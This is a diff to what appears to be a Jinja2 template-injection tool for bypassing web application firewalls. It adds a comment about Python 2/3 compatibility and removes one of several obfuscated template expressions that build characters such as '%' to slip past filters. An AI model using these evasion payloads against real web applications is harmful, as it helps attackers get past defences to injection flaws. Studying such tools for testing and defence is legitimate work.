@@ -18,6 +18,8 @@ ContextPayloads = Dict[str, Context]
 Waf = Callable[[str], bool]
 
 # 所有上下文的payload, 变量名不能重复
+# 注意这里的payload需要兼容python2/3
+
 context_payloads_stmts: ContextPayloads = {
     "{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}"
     + "{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}": {
@@ -54,10 +56,6 @@ context_payloads_stmts: ContextPayloads = {
 
 context_payloads_exprs = {
     "1.__mod__.__doc__.__getitem__(11)": "%",
-    (
-        "((dict(dict(dict(a=1)|tojson|batch(2),)|batch(2),)|join,"
-        + "dict(c=x)|join,dict()|trim|last)|join).format((9,9,9,1,9)|sum)"
-    ): "%",
     (
         "({0:1}|safe).replace((1|safe).rjust(2),"
         + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))"
